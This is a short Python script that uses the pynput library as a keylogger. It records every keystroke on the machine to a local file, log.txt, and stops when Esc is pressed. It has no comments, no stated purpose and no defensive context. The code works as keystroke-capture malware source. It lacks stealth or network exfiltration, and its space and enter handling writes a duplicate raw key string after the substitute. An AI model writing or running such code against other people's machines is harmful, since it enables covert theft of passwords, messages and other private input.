import pynput

from pynput.keyboard import Key, Listener



count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    #print(f"{key}")
    if count >= 1:
        count = 0
        write_file()
        keys = []

def write_file():
    with open("log.txt","a") as afile:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                afile.write(' ')
            elif k.find("enter") > 0:
                afile.write('\n')
            
            afile.write(str(key))


def on_release(key):
    if key == Key.esc:
        return False



with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


